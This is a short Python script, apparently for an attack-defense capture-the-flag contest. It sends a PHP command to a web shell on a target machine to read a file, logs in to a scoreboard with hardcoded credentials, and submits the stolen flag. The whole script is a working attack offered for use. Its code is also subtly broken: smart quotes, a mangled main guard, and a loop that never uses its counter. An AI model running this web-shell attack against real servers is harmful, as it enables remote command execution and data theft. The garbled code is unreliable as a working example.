# -*- coding: utf-8 -*-
import requests



def get_flag(url):

data = {

‘cmd’: ‘echo file_get_contents("/mydrivers/".scandir("/mydrivers/")[2]);’

}

res = requests.post(url=“http://”+url+"/shell.php", data=data)

return url,res.content



def auto_submit(req, ip, flag):

url = ‘http://192.168.80.1/submit_flag.php’

headers = {

“User-Agent”: “Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36”

}

data = {

‘ip’: ip,

‘flag’: flag

}

res = req.post(url=url, data=data, headers=headers)

print res.content



def login():

url = “http://192.168.80.1/login.php”

data = {

‘username’: ‘G001’,

‘password’: ‘123456’

}

req = requests.session()

results = req.post(url=url, data=data)

return req



if name == ‘main’:

logins = login()

for i in range(101,181):

url, flag = get_flag(“192.168.39.150”)

auto_submit(logins, url, flag)